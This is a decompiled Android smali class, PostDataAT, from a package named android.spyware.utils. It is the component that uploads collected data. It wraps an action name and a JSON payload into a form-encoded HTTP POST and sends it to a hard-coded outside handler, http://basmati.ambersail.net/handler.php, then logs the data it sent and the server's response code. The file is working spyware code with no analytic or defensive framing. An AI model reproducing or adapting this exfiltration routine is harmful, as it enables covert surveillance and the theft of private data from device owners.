.class public Landroid/spyware/utils/PostDataAT;
.super Landroid/os/AsyncTask;
.source "PostDataAT.java"


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Landroid/spyware/utils/Parameter;",
        "Ljava/lang/Void;",
        "Ljava/lang/Integer;",
        ">;"
    }
.end annotation


# direct methods
.method public constructor <init>()V
    .registers 1

    .prologue
    .line 32
    invoke-direct {v0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method


# virtual methods
.method protected varargs doInBackground([Landroid/spyware/utils/Parameter;)Ljava/lang/Integer;
    .registers 13
    .param p1, "params"    # [Landroid/spyware/utils/Parameter;

    .prologue
    .line 35
    const/4 v2, 0x0

    .line 38
    .local v2, "conn":Ljava/net/HttpURLConnection;
    const/4 v8, 0x0

    :try_start_2
    aget-object v8, v12, v8

    invoke-virtual {v8}, Landroid/spyware/utils/Parameter;->getAction()Ljava/lang/String;

    move-result-object v1

    .line 41
    .local v1, "action":Ljava/lang/String;
    const/4 v8, 0x0

    aget-object v8, v12, v8

    invoke-virtual {v8}, Landroid/spyware/utils/Parameter;->isJSONArray()Z

    move-result v8

    if-eqz v8, :cond_cc

    const/4 v8, 0x0

    aget-object v8, v12, v8

    invoke-virtual {v8}, Landroid/spyware/utils/Parameter;->getJArray()Lorg/json/JSONArray;

    move-result-object v8

    invoke-virtual {v8}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object v3

    .line 45
    .local v3, "data":Ljava/lang/String;
    :goto_1c
    new-instance v7, Ljava/net/URL;

    const-string v8, "http://basmati.ambersail.net/handler.php"

    invoke-direct {v7, v8}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 46
    .local v7, "url":Ljava/net/URL;
    new-instance v8, Landroid/net/Uri$Builder;

    invoke-direct {v8}, Landroid/net/Uri$Builder;-><init>()V

    const-string v9, "action"

    .line 47
    invoke-virtual {v8, v9, v1}, Landroid/net/Uri$Builder;->appendQueryParameter(Ljava/lang/String;Ljava/lang/String;)Landroid/net/Uri$Builder;

    move-result-object v8

    const-string v9, "data"

    .line 48
    invoke-virtual {v8, v9, v3}, Landroid/net/Uri$Builder;->appendQueryParameter(Ljava/lang/String;Ljava/lang/String;)Landroid/net/Uri$Builder;

    move-result-object v8

    .line 49
    invoke-virtual {v8}, Landroid/net/Uri$Builder;->build()Landroid/net/Uri;

    move-result-object v8

    invoke-virtual {v8}, Landroid/net/Uri;->getEncodedQuery()Ljava/lang/String;

    move-result-object v6

    .line 51
    .local v6, "request":Ljava/lang/String;
    invoke-virtual {v7}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v8

    move-object v0, v8

    check-cast v0, Ljava/net/HttpURLConnection;

    move-object v2, v0

    .line 52
    const/4 v8, 0x1

    invoke-virtual {v2, v8}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 54
    const-string v8, "POST"

    invoke-virtual {v2, v8}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 55
    const-string v8, "Content-Type"

    const-string v9, "application/x-www-form-urlencoded;charset=utf-8"

    invoke-virtual {v2, v8, v9}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 56
    const-string v8, "X-Requested-With"

    const-string v9, "XMLHttpRequest"

    invoke-virtual {v2, v8, v9}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 57
    invoke-virtual {v6}, Ljava/lang/String;->getBytes()[B

    move-result-object v8

    array-length v8, v8

    invoke-virtual {v2, v8}, Ljava/net/HttpURLConnection;->setFixedLengthStreamingMode(I)V

    .line 59
    new-instance v5, Ljava/io/DataOutputStream;

    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v8

    invoke-direct {v5, v8}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 60
    .local v5, "out":Ljava/io/DataOutputStream;
    invoke-virtual {v5, v6}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 61
    invoke-virtual {v5}, Ljava/io/DataOutputStream;->flush()V

    .line 64
    const-string v8, "::trace"

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    const-class v10, Landroid/spyware/utils/PostDataAT;

    invoke-virtual {v10}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "->doInBackground:"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v8, v9}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 65
    const-string v8, "::trace"

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    const-class v10, Landroid/spyware/utils/PostDataAT;

    invoke-virtual {v10}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "->doInBackground:"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v10

    invoke-static {v10}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v8, v9}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 68
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v8

    invoke-static {v8}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;
    :try_end_c5
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_c5} :catch_d9
    .catchall {:try_start_2 .. :try_end_c5} :catchall_fd

    move-result-object v8

    .line 72
    if-eqz v2, :cond_cb

    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 75
    .end local v1    # "action":Ljava/lang/String;
    .end local v3    # "data":Ljava/lang/String;
    .end local v5    # "out":Ljava/io/DataOutputStream;
    .end local v6    # "request":Ljava/lang/String;
    .end local v7    # "url":Ljava/net/URL;
    :cond_cb
    :goto_cb
    return-object v8

    .line 42
    .restart local v1    # "action":Ljava/lang/String;
    :cond_cc
    const/4 v8, 0x0

    :try_start_cd
    aget-object v8, v12, v8

    invoke-virtual {v8}, Landroid/spyware/utils/Parameter;->getJObject()Lorg/json/JSONObject;

    move-result-object v8

    invoke-virtual {v8}, Lorg/json/JSONObject;->toString()Ljava/lang/String;
    :try_end_d6
    .catch Ljava/io/IOException; {:try_start_cd .. :try_end_d6} :catch_d9
    .catchall {:try_start_cd .. :try_end_d6} :catchall_fd

    move-result-object v3

    .restart local v3    # "data":Ljava/lang/String;
    goto/16 :goto_1c

    .line 69
    .end local v1    # "action":Ljava/lang/String;
    .end local v3    # "data":Ljava/lang/String;
    :catch_d9
    move-exception v4

    .line 70
    .local v4, "ex":Ljava/io/IOException;
    :try_start_da
    const-string v8, "::trace"

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "::ERR  "

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-static {v4}, Landroid/util/Log;->getStackTraceString(Ljava/lang/Throwable;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v8, v9}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_f6
    .catchall {:try_start_da .. :try_end_f6} :catchall_fd

    .line 72
    if-eqz v2, :cond_fb

    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 75
    :cond_fb
    const/4 v8, 0x0

    goto :goto_cb

    .line 72
    .end local v4    # "ex":Ljava/io/IOException;
    :catchall_fd
    move-exception v8

    if-eqz v2, :cond_103

    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->disconnect()V

    :cond_103
    throw v8
.end method

.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .registers 3

    .prologue
    .line 32
    check-cast v2, [Landroid/spyware/utils/Parameter;

    invoke-virtual {v1, v2}, Landroid/spyware/utils/PostDataAT;->doInBackground([Landroid/spyware/utils/Parameter;)Ljava/lang/Integer;

    move-result-object v0

    return-object v0
.end method

.method protected onPostExecute(I)I
    .registers 2
    .param p1, "responseCode"    # I

    .prologue
    .line 79
    return v1
.end method
